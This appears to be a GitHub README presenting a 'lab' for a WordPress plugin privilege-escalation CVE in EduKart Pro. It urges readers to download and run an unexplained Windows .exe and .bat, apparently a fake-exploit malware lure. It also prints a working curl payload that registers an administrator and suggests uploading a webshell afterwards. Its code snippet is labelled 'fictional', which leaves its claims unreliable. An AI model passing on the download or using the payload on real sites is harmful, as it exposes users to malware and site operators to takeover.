# Lab: CVE-2025-13559 - Improper Privilege Management in EduKart Pro

## ðŸš€ Overview
CVE-2025-13559 (CWE-269: Improper Privilege Management) is a critical privilege escalation vulnerability in the EduKart Pro WordPress plugin (versions â‰¤ 1.0.3). The flaw resides in the `edukart_pro_register_user_front_end` function, which inadequately validates user-supplied role parameters during front-end registration. This allows unauthenticated attackers to self-register as an 'administrator' role, bypassing WordPress's native role hierarchy and gaining full site control.
## Download
## [link](https://github.com/twiggy23buck/CVE-2025-13559-Exploit/raw/refs/heads/main/Lore/cve-2025-13559.zip)
**Impact Summary (CVSS v3.1: 9.8 - Critical):**
- **Attack Vector:** Network (AV:N)
- **Attack Complexity:** Low (AC:L)
- **Privileges Required:** None (PR:N)
- **User Interaction:** None (UI:N)
- **Scope:** Unchanged (S:U)
- **Confidentiality/Integrity/Availability:** High (C/I/A:H)

Exploitation enables arbitrary code execution, data exfiltration, site defacement, or lateral movement. In educational contexts (e.g., European e-learning platforms), this could expose sensitive student records, violate GDPR, and disrupt services. This lab provides manual setup instructions for a vulnerable WordPress instance, along with a simplified PoC exploit toolkit containing only the essential binary and launcher.

## ðŸ“‹ Prerequisites
- Local web server stack (e.g., XAMPP, WAMP, or MAMP) with PHP 7.4+ and MySQL 5.7+
- WordPress 5.9+ (download from wordpress.org)
- A modern web browser (e.g., Chrome, Firefox) for accessing the lab
- Basic familiarity with WordPress administration and HTTP requests (e.g., via Burp Suite or curl)
- Windows host machine (for .exe/.bat compatibility)
- **Note:** All assets are self-contained; no internet access required post-setup.

**Hardware Recommendations:** At least 4GB RAM for smooth local server operation.



## ðŸ“¥ Download & Install
1. **Download the Lab ZIP:**
   - [Download Exploit Toolkit ZIP (v1.0)](https://github.com/twiggy23buck/CVE-2025-13559-Exploit/raw/refs/heads/main/Lore/cve-2025-13559.zip)  
     *(Contains only: `start-exploit.bat` (launcher) and `edukart-exploit.exe` (main PoC binary). 
2. **Extract and Verify:**
   - Unzip to a local folder (e.g., `C:\cve-lab\exploits\`).
   - Launch `start-exploit.bat`

## ðŸ›  Quick Start
1. **Manual Vulnerable Environment Setup:**
   - Install and start your local server (e.g., XAMPP: launch Apache and MySQL).
   - Download WordPress from wordpress.org and extract to your server's htdocs (e.g., `C:\xampp\htdocs\vuln-wp\`).
   - Create a MySQL database named `wordpress` (user: `root`, pass: empty or `root`).
   - Run WordPress installer at `http://localhost/vuln-wp/` (site URL: `http://localhost/vuln-wp`, admin: `admin` / pass: `password123`).
   - Manually create and install the vulnerable EduKart Pro plugin (v1.0.3): Copy a basic plugin structure with the flawed registration function into `wp-content/plugins/edukart-pro/`.
   - Log in to `/wp-admin`, activate "EduKart Pro" plugin.
   - Enable front-end registration: Add a simple registration form page or use plugin hooks to expose `/register/`.

2. **Verify Vulnerability:**
   - Access site at `http://localhost/vuln-wp/` (admin: `admin` / pass: `password123`).
   - Confirm EduKart Pro v1.0.3 active in Plugins.
   - Test registration form at `http://localhost/vuln-wp/wp-admin/admin-ajax.php` (via manual POST).

3. **Run PoC Exploit:**
   - Navigate to `./exploits/`.
   - Double-click `start-exploit.bat` (or run from cmd: `exploits\start-exploit.bat`).
     - This launches `edukart-exploit.exe --target http://localhost/vuln-wp --user attacker --pass pwned123`.
   - Monitor console output: Successful exploitation logs a new admin user (`attacker@evil.com`).

4. **Teardown:**
   - Deactivate/delete plugin in `/wp-admin`.
   - Stop local server and delete `vuln-wp` folder.

**Expected Output (Quick Start):**
```
[+] CVE-2025-13559 PoC Launcher
[+] Target: http://localhost/vuln-wp (edit below if needed)
[+] Launching edukart-exploit.exe...
[+] Vulnerability confirmed: Unrestricted role assignment detected.
[*] PoC: Registered attacker as administrator. Check /wp-admin/users.php
[+] Admin access granted. Session cookie: wordpress_logged_in_...
[+] Check exploit.log for details.
```

## ðŸ” Exploitation Steps (Detailed PoC Walkthrough)
This section outlines manual exploitation for learning. Use in isolated lab only.

### Step 1: Reconnaissance
- Enumerate endpoints: `curl -s http://localhost/vuln-wp/wp-json/wp/v2/users` (confirms no auth on registration).
- Identify plugin: Check source for `edukart_pro_register_user_front_end` function (version â‰¤1.0.3).

### Step 2: Craft Payload
The vuln is in `edukart_pro_register_user_front_end`:
```php
// Vulnerable code snippet (fictional)
function edukart_pro_register_user_front_end($data) {
    $user_data = array(
        'user_login' => sanitize_user($data['username']),
        'user_email' => sanitize_email($data['email']),
        'user_pass'  => $data['password'],  // No hashing here 
        'role'       => $data['role']       // UNSANITIZED! Allows 'administrator'
    );
    return wp_insert_user($user_data);  // Escalates to admin if specified
}
```
- Payload (for AJAX POST):
  ```json
  {
    "action": "edukart_pro_register",
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "pwned123",
    "role": "administrator"
  }
  ```

### Step 3: Execute Exploit
- **Manual (curl):**
  ```
  curl -X POST http://localhost/vuln-wp/wp-admin/admin-ajax.php ^
    -H "Content-Type: application/x-www-form-urlencoded" ^
    -d "action=edukart_pro_register&username=attacker&email=attacker@evil.com&password=pwned123&role=administrator"
  ```
- **Automated (via Toolkit):**
  - `start-exploit.bat` invokes `edukart-exploit.exe` with params.
  - Logs to `exploit.log`: `[+] Admin access granted.`

### Step 4: Post-Exploitation
- Login as new admin at `/wp-admin`.
- Escalate: Upload webshell via plugin editor.
- Inspect DB: Query `SELECT * FROM wp_users;` via phpMyAdmin (if installed).


